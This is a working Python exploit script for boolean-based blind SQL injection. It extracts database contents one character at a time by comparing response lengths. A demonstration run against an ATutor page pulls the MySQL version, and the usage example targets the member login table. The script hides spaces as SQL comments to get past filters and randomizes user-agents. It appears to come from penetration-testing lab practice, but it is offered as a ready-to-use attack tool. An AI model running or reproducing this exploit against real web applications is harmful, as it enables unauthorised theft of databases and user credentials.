# DEMONSTRATION
# $ python3 sqli_mysql_bool_response-length.py q get "select @@version" 30 "1')" "%23" http://192.168.252.12/ATutor/mods/_standard/social/index_public.php
# [?] Select a parameter to test for injection:: q
#  > q
#
# Retrieving query using: select @@version
# 5.5.47-0+deb8u1-log
#
# [+] Result: 5.5.47-0+deb8u1-log
#
# [+] Done!

#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 5

# Default string for empty parameters
def_str = "1234"

# Printable ASCII chars
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[!] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def sqli(url,headers,get_post,inj_param,params,inj_str,content_len):
    comment_inj_str = re.sub(" ","/**/",inj_str)
    inj_params = dict()

    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = comment_inj_str

    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())

    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)

    if r:
        resp_content_len = len(r.content)
        # print(str(resp_content_len))
        if (resp_content_len > content_len):
            return True

def inject(str_len,str_query,url,headers,get_post,inj_param,params,prefix,suffix,content_len):
    extracted = ""
    or_substr = " or (ascii(substring(("
    
    for i in range(1,str_len):
        # Check of current pos still contains a valid ASCII char using >
        inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))>" + str(ascii_begin) + suffix
        retr_pos = sqli(url,headers,get_post,inj_param,params,inj_str,content_len)
        if not retr_pos:
            break
        
        for j in range(ascii_begin,ascii_end):
            # Continue guessing the character by comparing using =
            inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))=" + str(j) + suffix
            retr_value = sqli(url,headers,get_post,inj_param,params,inj_str,content_len)
            if retr_value:
                extracted += chr(j)
                extracted_char = chr(j)
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
    
    print("\n")
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 8:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        query = sys.argv[3]
        content_len = int(sys.argv[4])
        prefix = sys.argv[5]
        suffix = sys.argv[6]
        url = sys.argv[7]
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,...> <get_or_post> <query> <content_len> <prefix> <suffix> <url>")
        print("[*] Example: " + sys.argv[0] + " q get \"select login from AT_members\" 20 \"1')\" \"%23\" http://192.168.252.14/ATutor/mods/_standard/social/index_public.php\n")
        exit(0)

    # Variables
    str_len = 50
    headers = random_agent()

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Print string
        print("Retrieving query using: " + query)
        output = inject(str_len,query,url,headers,get_post,inj_param,params,prefix,suffix,content_len)
        print("[+] Result: " + output)
        print("\n[+] Done!")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

